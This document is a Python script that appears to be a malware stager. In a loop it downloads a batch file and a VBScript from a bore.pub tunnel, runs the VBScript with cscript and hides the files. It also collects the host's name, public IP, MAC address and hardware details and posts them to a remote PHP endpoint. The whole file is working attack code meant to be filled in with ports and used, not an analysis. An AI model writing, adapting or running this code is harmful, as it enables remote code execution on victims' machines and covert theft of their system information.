import os
import requests
import ctypes
import socket
import time
import platform
import psutil
import subprocess
import uuid
import wmi
import concurrent.futures
import random
import shutil

def clear_screen():
    if os.name == 'nt':
        ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
        ctypes.windll.kernel32.GetStdHandle(-11).SetConsoleActiveScreenBuffer(
            ctypes.windll.kernel32.GetStdHandle(-10)
        )
    else:
        print("\033c", end="")

def send_data_to_url(url, data):
    try:
        response = requests.post(url, data=data)
        return f"Data sent to {url}: {response.text}"
    except Exception as e:
        return f"Error sending data to {url}: {str(e)}"

while True:
    try:
        home_directory = os.path.expanduser("~")
        web_page1_path = os.path.join(home_directory, "Script.bat")
        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")

        if os.path.exists(web_page1_path):
            os.remove(web_page1_path)
        if os.path.exists(vbs_file_path):
            os.remove(vbs_file_path)

        port = random.choice([SET YOUR PORTS])

        url1 = f"http://bore.pub:{port}/Script.io"
        url2 = f"http://bore.pub:{port}/VBSEX.io"

        response1 = requests.get(url1)
        if response1.status_code == 200:
            with open(web_page1_path, "wb") as file:
                file.write(response1.content)
            print(f"Downloaded and saved web page 1 to {web_page1_path}")
        else:
            print(f"Failed to download web page 1. Status code: {response1.status_code}")
            continue

        response2 = requests.get(url2)
        if response2.status_code == 200:
            with open(vbs_file_path, "wb") as file:
                file.write(response2.content)
            print(f"Downloaded and saved web page 2 to {vbs_file_path}")
        else:
            print(f"Failed to download web page 2. Status code: {response2.status_code}")
            continue

        if os.path.isfile(vbs_file_path):
            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)

        downloaded_files = [web_page1_path, vbs_file_path]

        def hide_files_windows(file_paths):
            try:
                for file_path in file_paths:
                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # Hide the file
            except Exception as e:
                print(f"Error hiding files on Windows: {str(e)}")

        def hide_files_unix(file_paths):
            try:
                for file_path in file_paths:
                    os.chmod(file_path, 0o400)  # You can adjust file permissions as needed
            except Exception as e:
                print(f"Error hiding files on Unix-based system: {str(e)}")

        if os.name == 'nt':
            hide_files_windows(downloaded_files)
        else:
            hide_files_unix(downloaded_files)

        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
        cpu = format(proc_info.Name)
        gpu = format(gpu_info.Name)
        System = platform.system()
        res = platform.release()
        mach = platform.machine()
        pros = platform.processor()
        ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        ip = requests.get('https://checkip.amazonaws.com').text.strip()

        hostname = socket.gethostname()
        data_to_send = {
            "DeviceID": f"{hostname}",
            "IP Address": f"{ip}",
            "System": f"{System} {res}",
            "Mac": f"{mac}",
            "Processor": f"{cpu}",
            "GPU": f"{gpu}",
            "Ram": f"{ram}",
            "Machine": f"{mach}",
        }

        php_urls = [f"http://bore.pub:{port}/Save.php"]

        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)

        for result in results:
            print(result)

        time.sleep(0)

    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(0)  # Sleep for 5 seconds before restarting
